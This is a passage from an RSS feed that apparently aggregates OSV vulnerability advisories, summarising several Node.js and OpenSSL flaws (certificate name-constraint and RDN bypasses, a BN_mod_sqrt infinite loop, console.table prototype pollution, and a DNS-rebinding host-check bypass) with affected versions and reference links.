                            <b>Details:</b> <b></b><br>Node.js &amp;lt; 12.22.9, &amp;lt; 14.18.3, &amp;lt; 16.13.2, and &amp;lt; 17.3.1 converts SANs (Subject Alternative Names) to a string format. It uses this string to check peer certificates against hostnames when validating connections. The string format was subject to an injection vulnerability when name constraints were used within a certificate chain, allowing the bypass of these name constraints.Versions of Node.js with the fix for this escape SANs containing the problematic characters in order to prevent the injection. This behavior can be reverted through the --security-revert command-line option.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2021-44533: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2021-44533</link>
                    <pubDate>2024-12-16T14:03:25.925Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2021-44533'>https://osv.dev/vulnerability/BIT-node-min-2021-44533</a><br>
                            <b>Published:</b> 2024-12-16T14:03:25.925Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://hackerone.com/reports/1429694'>https://hackerone.com/reports/1429694</a></li><li>- <a target='_blank' href='https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/'>https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20220325-0007/'>https://security.netapp.com/advisory/ntap-20220325-0007/</a></li><li>- <a target='_blank' href='https://www.debian.org/security/2022/dsa-5170'>https://www.debian.org/security/2022/dsa-5170</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuapr2022.html'>https://www.oracle.com/security-alerts/cpuapr2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujul2022.html'>https://www.oracle.com/security-alerts/cpujul2022.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Node.js &amp;lt; 12.22.9, &amp;lt; 14.18.3, &amp;lt; 16.13.2, and &amp;lt; 17.3.1 did not handle multi-value Relative Distinguished Names correctly. Attackers could craft certificate subjects containing a single-value Relative Distinguished Name that would be interpreted as a multi-value Relative Distinguished Name, for example, in order to inject a Common Name that would allow bypassing the certificate subject verification.Affected versions of Node.js that do not accept multi-value Relative Distinguished Names and are thus not vulnerable to such attacks themselves. However, third-party code that uses node&#x27;s ambiguous presentation of certificate subjects may be vulnerable.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2022-0778: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2022-0778</link>
                    <pubDate>2024-12-16T14:03:14.529Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2022-0778'>https://osv.dev/vulnerability/BIT-node-min-2022-0778</a><br>
                            <b>Published:</b> 2024-12-16T14:03:14.529Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://packetstormsecurity.com/files/167344/OpenSSL-1.0.2-1.1.1-3.0-BN_mod_sqrt-Infinite-Loop.html'>http://packetstormsecurity.com/files/167344/OpenSSL-1.0.2-1.1.1-3.0-BN_mod_sqrt-Infinite-Loop.html</a></li><li>- <a target='_blank' href='http://seclists.org/fulldisclosure/2022/May/33'>http://seclists.org/fulldisclosure/2022/May/33</a></li><li>- <a target='_blank' href='http://seclists.org/fulldisclosure/2022/May/35'>http://seclists.org/fulldisclosure/2022/May/35</a></li><li>- <a target='_blank' href='http://seclists.org/fulldisclosure/2022/May/38'>http://seclists.org/fulldisclosure/2022/May/38</a></li><li>- <a target='_blank' href='https://cert-portal.siemens.com/productcert/pdf/ssa-712929.pdf'>https://cert-portal.siemens.com/productcert/pdf/ssa-712929.pdf</a></li><li>- <a target='_blank' href='https://git.openssl.org/gitweb/?p=openssl.git%3Ba=commitdiff%3Bh=3118eb64934499d93db3230748a452351d1d9a65'>https://git.openssl.org/gitweb/?p=openssl.git%3Ba=commitdiff%3Bh=3118eb64934499d93db3230748a452351d1d9a65</a></li><li>- <a target='_blank' href='https://git.openssl.org/gitweb/?p=openssl.git%3Ba=commitdiff%3Bh=380085481c64de749a6dd25cdf0bcf4360b30f83'>https://git.openssl.org/gitweb/?p=openssl.git%3Ba=commitdiff%3Bh=380085481c64de749a6dd25cdf0bcf4360b30f83</a></li><li>- <a target='_blank' href='https://git.openssl.org/gitweb/?p=openssl.git%3Ba=commitdiff%3Bh=a466912611aa6cbdf550cd10601390e587451246'>https://git.openssl.org/gitweb/?p=openssl.git%3Ba=commitdiff%3Bh=a466912611aa6cbdf550cd10601390e587451246</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2022/03/msg00023.html'>https://lists.debian.org/debian-lts-announce/2022/03/msg00023.html</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2022/03/msg00024.html'>https://lists.debian.org/debian-lts-announce/2022/03/msg00024.html</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/323SNN6ZX7PRJJWP2BUAFLPUAE42XWLZ/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/323SNN6ZX7PRJJWP2BUAFLPUAE42XWLZ/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/GDB3GQVJPXJE7X5C5JN6JAA4XUDWD6E6/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/GDB3GQVJPXJE7X5C5JN6JAA4XUDWD6E6/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/W6K3PR542DXWLEFFMFIDMME4CWMHJRMG/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/W6K3PR542DXWLEFFMFIDMME4CWMHJRMG/</a></li><li>- <a target='_blank' href='https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2022-0002'>https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2022-0002</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202210-02'>https://security.gentoo.org/glsa/202210-02</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20220321-0002/'>https://security.netapp.com/advisory/ntap-20220321-0002/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20220429-0005/'>https://security.netapp.com/advisory/ntap-20220429-0005/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20240621-0006/'>https://security.netapp.com/advisory/ntap-20240621-0006/</a></li><li>- <a target='_blank' href='https://support.apple.com/kb/HT213255'>https://support.apple.com/kb/HT213255</a></li><li>- <a target='_blank' href='https://support.apple.com/kb/HT213256'>https://support.apple.com/kb/HT213256</a></li><li>- <a target='_blank' href='https://support.apple.com/kb/HT213257'>https://support.apple.com/kb/HT213257</a></li><li>- <a target='_blank' href='https://www.debian.org/security/2022/dsa-5103'>https://www.debian.org/security/2022/dsa-5103</a></li><li>- <a target='_blank' href='https://www.openssl.org/news/secadv/20220315.txt'>https://www.openssl.org/news/secadv/20220315.txt</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuapr2022.html'>https://www.oracle.com/security-alerts/cpuapr2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujul2022.html'>https://www.oracle.com/security-alerts/cpujul2022.html</a></li><li>- <a target='_blank' href='https://www.tenable.com/security/tns-2022-06'>https://www.tenable.com/security/tns-2022-06</a></li><li>- <a target='_blank' href='https://www.tenable.com/security/tns-2022-07'>https://www.tenable.com/security/tns-2022-07</a></li><li>- <a target='_blank' href='https://www.tenable.com/security/tns-2022-08'>https://www.tenable.com/security/tns-2022-08</a></li><li>- <a target='_blank' href='https://www.tenable.com/security/tns-2022-09'>https://www.tenable.com/security/tns-2022-09</a></li></ul><br>
                            <b>Details:</b> <b></b><br>The BN_mod_sqrt() function, which computes a modular square root, contains a bug that can cause it to loop forever for non-prime moduli. Internally this function is used when parsing certificates that contain elliptic curve public keys in compressed form or explicit elliptic curve parameters with a base point encoded in compressed form. It is possible to trigger the infinite loop by crafting a certificate that has invalid explicit curve parameters. Since certificate parsing happens prior to verification of the certificate signature, any process that parses an externally supplied certificate may thus be subject to a denial of service attack. The infinite loop can also be reached when parsing crafted private keys as they can contain explicit elliptic curve parameters. Thus vulnerable situations include: - TLS clients consuming server certificates - TLS servers consuming client certificates - Hosting providers taking certificates or private keys from customers - Certificate authorities parsing certification requests from subscribers - Anything else which parses ASN.1 elliptic curve parameters Also any other applications that use the BN_mod_sqrt() where the attacker can control the parameter values are vulnerable to this DoS issue. In the OpenSSL 1.0.2 version the public key is not parsed during initial parsing of the certificate which makes it slightly harder to trigger the infinite loop. However any operation which requires the public key from the certificate will trigger the infinite loop. In particular the attacker can use a self-signed certificate to trigger the loop during verification of the certificate signature. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0. It was addressed in the releases of 1.1.1n and 3.0.2 on the 15th March 2022. Fixed in OpenSSL 3.0.2 (Affected 3.0.0,3.0.1). Fixed in OpenSSL 1.1.1n (Affected 1.1.1-1.1.1m). Fixed in OpenSSL 1.0.2zd (Affected 1.0.2-1.0.2zc).
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2022-21824: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2022-21824</link>
                    <pubDate>2024-12-16T14:03:02.323Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2022-21824'>https://osv.dev/vulnerability/BIT-node-min-2022-21824</a><br>
                            <b>Published:</b> 2024-12-16T14:03:02.323Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://hackerone.com/reports/1431042'>https://hackerone.com/reports/1431042</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2022/10/msg00006.html'>https://lists.debian.org/debian-lts-announce/2022/10/msg00006.html</a></li><li>- <a target='_blank' href='https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/'>https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20220325-0007/'>https://security.netapp.com/advisory/ntap-20220325-0007/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20220729-0004/'>https://security.netapp.com/advisory/ntap-20220729-0004/</a></li><li>- <a target='_blank' href='https://www.debian.org/security/2022/dsa-5170'>https://www.debian.org/security/2022/dsa-5170</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuapr2022.html'>https://www.oracle.com/security-alerts/cpuapr2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujul2022.html'>https://www.oracle.com/security-alerts/cpujul2022.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Due to the formatting logic of the &quot;console.table()&quot; function it was not safe to allow user controlled input to be passed to the &quot;properties&quot; parameter while simultaneously passing a plain object with at least one property as the first parameter, which could be &quot;__proto__&quot;. The prototype pollution has very limited control, in that it only allows an empty string to be assigned to numerical keys of the object prototype.Node.js &amp;gt;= 12.22.9, &amp;gt;= 14.18.3, &amp;gt;= 16.13.2, and &amp;gt;= 17.3.1 use a null protoype for the object these properties are being assigned to.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2022-32212: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2022-32212</link>
                    <pubDate>2024-12-16T14:02:50.527Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2022-32212'>https://osv.dev/vulnerability/BIT-node-min-2022-32212</a><br>
                            <b>Published:</b> 2024-12-16T14:02:50.527Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://hackerone.com/reports/1632921'>https://hackerone.com/reports/1632921</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A OS Command Injection vulnerability exists in Node.js versions &amp;lt;14.20.0, &amp;lt;16.20.0, &amp;lt;18.5.0 due to an insufficient IsAllowedHost check that can easily be bypassed because IsIPAddress does not properly check if an IP address is invalid before making DBS requests allowing rebinding attacks.
                        ]]>
                    </description>
                </item>
            
            </channel>
        </rss>
        